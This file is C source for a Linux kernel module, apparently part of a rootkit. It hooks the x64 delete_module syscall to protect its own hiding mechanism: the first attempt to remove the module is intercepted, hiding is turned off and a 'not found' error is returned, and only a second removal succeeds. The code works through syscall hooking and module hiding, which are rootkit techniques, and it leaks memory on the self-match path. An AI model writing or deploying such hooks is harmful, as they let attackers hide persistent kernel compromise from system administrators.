#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/errno.h>

#include <hide.h>
#include <hook.h>

static long __x64_sys_delete_module_hook(const struct pt_regs *regs)
{
    // syscall args
    char __user *name_user = (char *)regs->di;
    // unsigned int flags = regs->si;

    char *name = kmalloc(MODULE_NAME_LEN, GFP_KERNEL);
    if (!name)
        return -ENOENT;

    if (strncpy_from_user(name, name_user, MODULE_NAME_LEN-1) < 0)
        goto regular_call;
    name[MODULE_NAME_LEN-1] = '\0';
    
    if (!strncmp(name, THIS_MODULE->name, MODULE_NAME_LEN)) {
        /** We can't call the original delete_module from within this hook;
         * upon returning, this function's memory will have been deallocated.
         * So instead, the first time the module is rmmod'ed, the module hiding
         * is canceled, and the hook is unset. Upon a second rmmod the module
         * will be removed regularly.
         * 
         * It's possible to pull some assembly trickery in here to prevent
         * the original syscall from returning back here, but I feel it's
         * unnecessary at this point.
         */
        hide_disable_thismodule();
        hide_hook_disable_delete_module();
        return -ENOENT;
    }

regular_call:
    kfree(name);
    return hook_original__x64_sys_delete_module(regs);
}

HOOK_X64_SYSCALL_DEFINE(hide, delete_module, 176, &__x64_sys_delete_module_hook);
